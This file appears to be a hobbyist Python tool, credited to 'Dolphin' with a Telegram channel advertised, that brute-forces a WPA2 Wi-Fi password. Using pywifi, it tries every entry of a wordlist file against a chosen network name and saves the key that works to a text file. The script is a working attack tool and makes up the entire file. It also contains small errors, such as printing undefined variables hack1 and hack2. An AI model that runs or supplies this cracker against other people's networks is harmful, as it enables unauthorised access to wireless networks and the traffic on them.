import pywifi 
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
import time


nam1 = """
        code by: Dolphin @a11230
   join Telegram for more : @team_0x0
 __    __ _  __ _                    _    
/ / /\ \ (_)/ _(_)   /\  /\__ _  ___| | __
\ \/  \/ / | |_| |  / /_/ / _` |/ __| |/ /
 \  /\  /| |  _| | / __  / (_| | (__|   < 
  \/  \/ |_|_| |_| \/ /_/ \__,_|\___|_|\_\ .v2
  """
nam2 = ""
""
print(hack1, hack2)

try:
    wifi_name = input("[*] Enter Wifi Name: ")
    print('[#] ================')
    wifi=PyWiFi()
    INF=wifi.interfaces()[0]
    INF.scan()

except:
    pass

def main(SSID,PASSWORD):
    my=Profile()
    my.ssid=SSID
    my.auth=const.AUTH_ALG_OPEN
    my.akm.append(const.AKM_TYPE_WPA2PSK)
    my.cipher=const.CIPHER_TYPE_CCMP
    my.key=PASSWORD
    tmp=INF.add_network_profile(my)
    INF.connect(tmp)
    time.sleep(.9) 

    if INF.status() == 3:
        print(f"[-] Check Password: >> {PASSWORD}")

    if INF.status() == 4:
        time.sleep(0.2)
        print(f"[+] Found Password: => {PASSWORD}")
        f = open("WifiPassword.txt", "a", encoding='utf-8')
        f.write(f"[+] Wifiname: {wifi_name}  |  Password:  {PASSWORD} \n")
        print('[#] ================')
        print("[$] Saved on (WifiPassword.txt) \n[~] Check File >> i Well Exit in 10 Sec")
        time.sleep(10)
        exit()

A=False
def goin():
    
     for i in open("pin.txt","+r").readlines(): # Crate File and Rename ("pin.txt")
        i=i.strip('\n')

        main(wifi_name,i)
      
goin()

print('[#] ================')
print(f"[?] No Password Found > Check Name: [ {wifi_name} ] \n[&] or tray again With New Password in [ pin.txt ]")
print("[~] Script Finsh | Exit in 10 Sec")
time.sleep(10)
